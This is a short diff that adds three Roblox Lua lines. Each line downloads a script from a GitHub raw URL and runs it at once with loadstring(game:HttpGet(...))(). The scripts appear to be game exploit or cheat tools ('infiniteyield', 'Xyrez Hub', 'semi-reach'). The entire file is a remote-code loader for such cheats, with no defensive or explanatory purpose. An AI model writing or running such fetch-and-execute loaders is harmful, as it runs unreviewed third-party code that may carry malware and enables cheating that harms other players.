@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/serhsehrshvs/reach/refs/heads/main/Xyrez%20Hub"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/serhsehrshvs/reach/refs/heads/main/semi-reach"))()
